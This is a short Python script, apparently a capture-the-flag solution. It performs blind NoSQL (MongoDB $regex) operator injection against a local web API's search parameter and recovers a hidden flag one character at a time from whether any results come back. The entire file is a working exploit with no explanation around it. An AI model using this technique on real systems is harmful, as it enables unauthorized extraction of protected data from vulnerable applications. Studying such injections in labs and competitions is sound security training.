import string

import requests

base_url = "http://localhost:3001/api/v1/post"
table = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_"

flag = ""

while True:
    for char in table:
        result = requests.get(f"{base_url}?searchParam[deleted]=true&searchParam[flag][$regex]=^{flag}{char}")
        posts = result.json()
        if len(posts) > 0:
            flag += char
            print(flag)
            break
    if "}" in flag:
        break

print("flag", flag)

